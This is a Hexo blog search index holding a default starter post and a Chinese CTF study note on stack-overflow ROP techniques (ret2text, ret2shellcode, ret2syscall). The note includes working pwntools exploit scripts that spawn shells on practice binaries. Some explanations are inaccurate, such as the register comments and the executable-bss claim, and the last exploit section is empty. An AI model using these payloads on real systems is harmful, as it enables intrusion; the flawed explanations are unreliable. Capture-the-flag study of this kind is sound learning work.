<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hexo</title>
    <url>/2025/03/28/hello-world/</url>
    <content><![CDATA[<p>这是简介</p>
<span id="more"></span>
<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>基本 ROP</title>
    <url>/2025/03/29/%E5%9F%BA%E6%9C%AC%20ROP/</url>
    <content><![CDATA[<p>一些学习记录</p>
<span id="more"></span>
<p><font style="color:rgba(0, 0, 0, 0.87);">来源：</font><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">CTF-Wiki</a></p>
<p>返回导向编程（Return-Oriented Programming，缩写：ROP）是计算机安全中的一种漏洞利用技术，该技术允</p>
<p>许攻击者在程序启用了安全保护技术（如堆栈不可执行—NX保护）的情况下控制程序执行流，执行恶意代码。</p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><strong><font style="color:rgba(0, 0, 0, 0.87);">使用方法：</font></strong></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">利用栈溢出控制程序中函数的返回地址，再借助 ROPgadget 寻找程序&#x2F;libc 中带有ret的指令，利用这些指令构造</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">一个指令序列，从而控制程序的执行。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">ps:为了方便，后续所有题目我都会命名为“pwn”</font></p>
<h2 id="ret2text"><font style="color:rgba(0, 0, 0, 0.87);">ret2text</font></h2>
以ctf-wiki中的题为例：[ret2text](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text)



<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ret2text checksec ret2text</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">可以看出程序是 32 位程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">    gets((<span class="type">char</span> *)&amp;v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。</p>
<p>同时binary中还有一个后面secure函数，其内调用了system(“&#x2F;bin&#x2F;sh”)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">secure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(&amp;unk_8048760, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080485FD 55                            push    ebp</span><br><span class="line">.text:080485FE 89 E5                         mov     ebp, esp</span><br><span class="line">.text:08048600 83 EC 28                      sub     esp, 28h</span><br><span class="line">.text:08048603 C7 04 24 00 00 00 00          mov     dword ptr [esp], 0              ; timer</span><br><span class="line">.text:0804860A E8 61 FE FF FF                call    _time</span><br><span class="line">.text:0804860A</span><br><span class="line">.text:0804860F 89 04 24                      mov     [esp], eax                      ; seed</span><br><span class="line">.text:08048612 E8 99 FE FF FF                call    _srand</span><br><span class="line">.text:08048612</span><br><span class="line">.text:08048617 E8 C4 FE FF FF                call    _rand</span><br><span class="line">.text:08048617</span><br><span class="line">.text:0804861C 89 45 F4                      mov     [ebp+secretcode], eax</span><br><span class="line">.text:0804861F 8D 45 F0                      lea     eax, [ebp+input]</span><br><span class="line">.text:08048622 89 44 24 04                   mov     [esp+4], eax</span><br><span class="line">.text:08048626 C7 04 24 60 87 04 08          mov     dword ptr [esp], offset unk_8048760</span><br><span class="line">.text:0804862D E8 BE FE FF FF                call    ___isoc99_scanf</span><br><span class="line">.text:0804862D</span><br><span class="line">.text:08048632 8B 45 F0                      mov     eax, [ebp+input]</span><br><span class="line">.text:08048635 3B 45 F4                      cmp     eax, [ebp+secretcode]</span><br><span class="line">.text:08048638 75 0C                         jnz     short locret_8048646</span><br><span class="line">.text:08048638</span><br><span class="line">.text:0804863A C7 04 24 63 87 04 08          mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:08048641 E8 4A FE FF FF                call    _system</span><br></pre></td></tr></table></figure>

<p>那么如果我们直接控制程序返回至 0x0804863A ，那么就可以得到系统的 shell 了。</p>
<p>寻找偏移：</p>
<p>__cdecl 函数调用约定会把形参自右向左依次压入栈中。（参考：<a href="https://www.cnblogs.com/mysky007/p/12913778.html">函数调用约定</a>）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">    gets((<span class="type">char</span> *)&amp;v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一般情况是一个参数，所以相对于ret_addr的偏移量offset&#x3D;0x64+4，现在有两个形参，所以</p>
<p>offset&#x3D;0x64+4+4+4</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x64</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span></span><br><span class="line">system_addr = <span class="number">0x804863a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*offset + p32(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="ret2syscall"><font style="color:rgba(0, 0, 0, 0.87);">ret2shellcode</font></h2>
ret2shellcode是指当数据段中有可写可执行段时，向该段中写入目标函数代码（通常为system('/bin/sh')）。然后通过栈溢出将返回地址改为该代码的头地址，使之执行。



<p>1、shellcode：</p>
<p>一段能完成某个功能的汇编代码。常见功能是获取目标系统的shell。</p>
<p>2、条件：</p>
<p>由于shellcode需要填充，并且控制程序执行shellcode，故填充的区域需要具有可执行权限。</p>
<p>以ctf-wiki中的题为例：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/kali/Desktop/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。</p>
<p>IDA打开：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">0x64u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">可以看到，存在栈溢出，不过这次还通过strncpy将对应的字符串复制到 buf2 处（参考：</font><a href="https://www.runoob.com/cprogramming/c-function-strncpy.html">strncpy</a>）</p>
<p><font style="color:rgba(0, 0, 0, 0.87);">同时可以快速知道溢出的相对于ret_addr的偏移量为：offset &#x3D; 0x64+4 +4+4</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">ret2shellcode在该binary上的应用就是：  </font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">将shellcode通过gets函数输入，通过strncpy函数拷贝到buf2空间存储，然后通过溢出劫持控制流到buf2，执行shellcode。  </font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">那么接下来就是如何寻找buf2的地址，和如何调试查看buf2空间是否具有可执行权限的问题了。  </font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">IDA下的buf2地址查看：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804A080                               public buf2</span><br><span class="line">.bss:0804A080                               ; char buf2[100]</span><br></pre></td></tr></table></figure>

<p>地址为：0x0804A080</p>
<p><font style="color:rgba(0, 0, 0, 0.87);">这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">依次输入:</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb pwn</span><br><span class="line">b main</span><br><span class="line">r</span><br><span class="line">vmmap</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">Start      End        Perm      Name</span><br><span class="line">0x08048000 0x08049000 r-xp      /home/kali/Desktop/pwn</span><br><span class="line">0x08049000 0x0804a000 r--p      /home/kali/Desktop/pwn</span><br><span class="line">0x0804a000 0x0804b000 rw-p      /home/kali/Desktop/pwn</span><br><span class="line">0xf7d67000 0xf7d8a000 r--p      /usr/lib/i386-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0804a000 0x0804b000 rw-p      /home/kali/Desktop/pwn</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">EXP:</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span>      <span class="comment"># 64为程序就改为&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x64</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span></span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(offset,<span class="string">b&#x27;a&#x27;</span>) + p32(buf2_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<h2 id="TTZ92"><font style="color:rgba(0, 0, 0, 0.87);">ret2syscall</font></h2>
<font style="color:rgba(0, 0, 0, 0.87);">ret2syscall，即控制程序执行系统调用，获取 shell。</font>

<p><font style="color:rgba(0, 0, 0, 0.87);">系统调用下的shell：</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/Nashi_Ko/article/details/120288385">Linux X86架构 32 64系统调用表</a></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">32位binary下的shell：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eax:0xb                    #系统调用号，即 eax 应该为 0xb</span><br><span class="line">ebx:bin_sh_addr            #第一个参数，即 ebx 应该指向 /bin/sh 的地址</span><br><span class="line">ecx:0                      #第二个参数，即 ecx 应该为 0xb</span><br><span class="line">edx:0                      #第三个参数，即 edx 应该为 0xb</span><br><span class="line">int 0x80                   #触发中断</span><br></pre></td></tr></table></figure>



<p><font style="color:rgba(0, 0, 0, 0.87);">payload</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=b&#x27;a&#x27;*offest+p32(eax_addr)+p32(0x0b)+p32( edx_ecx_ebx_addr)+p32(0x0)+p32(0x0)+p32(binsh_addr)+p32(int0x80_addr)</span><br></pre></td></tr></table></figure>



<p><font style="color:rgba(0, 0, 0, 0.87);">64位binary下的shell：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rax:0x3b  # 59</span><br><span class="line">rdi:bin_sh_addr</span><br><span class="line">rsi:0</span><br><span class="line">rdx:0</span><br><span class="line">rcx:0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">payload</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=b&#x27;a&#x27;*offest+p64(rdi_addr)+p64(binsh_addr)+p64(rax_rdx_rbx_addr)+p64(0x3b)+p64(0x0)+p64(0X0)+p64(rsi_addr)+p64(0x0)+p64(syscall_addr)</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">以ctf-wiki中的题为例：</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">checksec</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/kali/Desktop/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">源程序为 32 位，开启了 NX 保护。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">IDA打开</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">    gets(&amp;v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">和之前一样，存在栈溢出，溢出点 v4,偏移量：offset  &#x3D; 0x64+4+4+4</font></p>
<p>发现 &#x2F;bin&#x2F;sh 字符串以及它的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rodata:080BE408 2F 62 69 6E 2F 73 68 00       aBinSh db &#x27;/bin/sh&#x27;,0                   ; DATA XREF: .data:shell↓o</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">没有 system 或者 execve 函数，这时候我们就要利用如下系统调用来获取 shell：</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><strong><font style="color:rgba(0, 0, 0, 0.87);">首先，寻找 eax 的 gadget</font></strong></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">输入：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">选择：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x080bb196 : pop eax ; ret</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><strong><font style="color:rgba(0, 0, 0, 0.87);">类似的，我们可以得到控制其它寄存器的 gadgets</font></strong></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">输入：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">得到：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret      # 直接给出了剩余的三个寄存器的 gadget</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">选择：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>



<p><strong>int 0x80:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &#x27;int&#x27;</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">─$ ROPgadget --binary pwn --only &#x27;int&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080890b5 : int 0xcf</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><strong><font style="color:rgba(0, 0, 0, 0.87);">上面通过IDA找到了 &#x2F;bin&#x2F;sh 的地址，也可以通过</font></strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop  --string &#x27;/bin/sh&#x27;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);">得到：</font></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ ROPgadget --binary pwn  --string &#x27;/bin/sh&#x27;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">EXP：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x64</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span></span><br><span class="line">eax = <span class="number">0x080bb196</span></span><br><span class="line">edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*offset + p32(eax) + p32(<span class="number">0xb</span>) + p32(edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(binsh) + p32(int_0x80)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">64位程序和32位大致一样，不同的就是64位程序通过“syscall”触发中断，32位程序是通过“int 0x80”</font></p>
<p><font style="color:rgba(0, 0, 0, 0.87);">ROP gadgets：</font></p>
<p><strong><font style="color:rgba(0, 0, 0, 0.87);">rax_rdx_rbx:</font></strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;rax&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>rdi:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &#x27;pop|ret&#x27; | grep &#x27;rdi&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>rsi:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &#x27;pop|ret&#x27; | grep &#x27;rsi&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>binsh:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --string &#x27;/bin/sh&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>syscall:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn | grep &#x27;syscall&#x27;</span><br></pre></td></tr></table></figure>



<p>EXP：</p>
